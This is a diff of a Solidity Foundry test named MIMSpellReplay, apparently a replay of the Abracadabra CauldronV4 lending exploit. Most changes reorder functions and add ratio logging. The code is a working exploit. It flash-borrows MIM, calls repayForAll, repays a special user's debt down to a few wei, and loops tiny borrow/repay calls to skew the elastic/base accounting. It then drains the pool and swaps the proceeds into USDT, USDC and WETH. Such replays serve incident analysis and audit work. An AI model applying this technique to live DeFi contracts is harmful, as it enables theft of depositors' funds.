@@ -47,36 +47,6 @@ contract MIMSpellReplay is Test {
         _postExploit();
     }
 
-    function _setUpApprovals() internal {
-        MIM.approve(address(DegenBox), type(uint256).max);
-        MIM.approve(address(MIM_3LP3CRV), type(uint256).max);
-        USDT.approve(address(USDT_WBTC_WETH), type(uint256).max);
-        Crv3_USD_BTC_ETH.approve(address(yvCurve_3Crypto_f), type(uint256).max);
-        yvCurve_3Crypto_f.approve(address(DegenBox), type(uint256).max);
-    }
-
-    function _postExploit() internal {
-        // Exchange MIM to USDT
-        MIM_3LP3CRV.exchange_underlying(0, 2, 4_300_000 * 1e18, 0);
-
-        // Obtain USDC tokens
-        MIM_USDC.swap(address(this), true, 100_000 * 1e18, 75_212_254_740_446_025_735_711, "");
-
-        // Obtain WETH tokens
-
-        USDC_WETH.swap(
-            address(this),
-            true,
-            int256(USDC.balanceOf(address(this))),
-            1_567_565_235_711_739_205_094_520_276_811_199,
-            ""
-        );
-
-        console.log("\nExploiter MIM balance after attack", MIM.balanceOf(address(this)), MIM.decimals());
-
-        console.log("Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals());
-    }
-
     function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
         external
         returns (bytes32)
@@ -91,12 +61,16 @@ contract MIMSpellReplay is Test {
 
         DegenBox.deposit(address(MIM), address(this), address(DegenBox), _amount, 0);
         MIM.transfer(address(CauldronV4), 240_000 * 1e18);
+
+        // Repay all users debt
         CauldronV4.repayForAll(uint128(240_000 * 1e18), true);
 
         console.log("\nRatio Logs After repayForAll");
         _logBorrow();
 
         address[] memory users = new address[](15);
+
+        // Precomputed users
         users[0] = 0x941ec857134B13c255d6EBEeD1623b1904378De9;
         users[1] = 0x2f2A75279a2AC0C6b64087CE1915B1435b1d3ce2;
         users[2] = 0x577BE3eD9A71E1c355f519BBDF5f09Ba2018b1Cc;
@@ -131,6 +105,8 @@ contract MIMSpellReplay is Test {
         // Prepare Collateral Deposit
         uint256 depositAmount = _prepareCollateral();
 
+        console.log("\nTotal Collateral", depositAmount);
+
         // Exploit
         {
             HelperExploitContract helper = new HelperExploitContract(address(this));
@@ -152,6 +128,9 @@ contract MIMSpellReplay is Test {
                 address(MIM), address(this), address(this), DegenBox.balanceOf(address(MIM), address(this)), 0
             );
 
+            console.log("\nRatio Logs after borrowing Total Pool Balance");
+            _logBorrow();
+
             console.log("\nPool Balance after withdraw", DegenBox.balanceOf(address(MIM), address(CauldronV4)));
             console.log("Attacker's MIM Balance", MIM.balanceOf(address(this)));
         }
@@ -159,6 +138,36 @@ contract MIMSpellReplay is Test {
         // Repaying flashloan
         MIM.transfer(address(DegenBox), amount + fee);
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function _setUpApprovals() internal {
+        MIM.approve(address(DegenBox), type(uint256).max);
+        MIM.approve(address(MIM_3LP3CRV), type(uint256).max);
+        USDT.approve(address(USDT_WBTC_WETH), type(uint256).max);
+        Crv3_USD_BTC_ETH.approve(address(yvCurve_3Crypto_f), type(uint256).max);
+        yvCurve_3Crypto_f.approve(address(DegenBox), type(uint256).max);
+    }
+
+    function _postExploit() internal {
+        // Exchange MIM to USDT
+        MIM_3LP3CRV.exchange_underlying(0, 2, 4_300_000 * 1e18, 0);
+
+        // Obtain USDC tokens
+        MIM_USDC.swap(address(this), true, 100_000 * 1e18, 75_212_254_740_446_025_735_711, "");
+
+        // Obtain WETH tokens
+
+        USDC_WETH.swap(
+            address(this),
+            true,
+            int256(USDC.balanceOf(address(this))),
+            1_567_565_235_711_739_205_094_520_276_811_199,
+            ""
+        );
+
+        console.log("\nExploiter MIM balance after attack", MIM.balanceOf(address(this)), MIM.decimals());
+
+        console.log("Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals());
     }
 
     function _logBorrow() public returns (uint128 elastic, uint128 base) {
@@ -186,7 +195,11 @@ contract MIMSpellReplay is Test {
         address specialUser = 0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A;
         uint256 borrowPart = CauldronV4.userBorrowPart(specialUser);
         CauldronV4.repay(specialUser, true, borrowPart - 100);
+        console.log("\nRatio Logs while repaying special user loans");
+        _logBorrow();
         for (uint8 i; i < 3; ++i) {
+            console.log("\nRatio Logs while repaying special user loans");
+            _logBorrow();
             CauldronV4.repay(specialUser, true, 1);
         }
 
@@ -251,12 +264,12 @@ contract HelperExploitContract {
         while (i < 90) {
             CauldronV4.borrow(address(this), 1);
 
-            if (i % 10 == 0) {
+            CauldronV4.repay(address(this), true, 1);
+            if (i % 5 == 0 || i == 89) {
                 console.log("");
                 console.log("Ratio after", i + 1, "borrow");
                 logger._logBorrow();
             }
-            CauldronV4.repay(address(this), true, 1);
 
             ++i;
         }
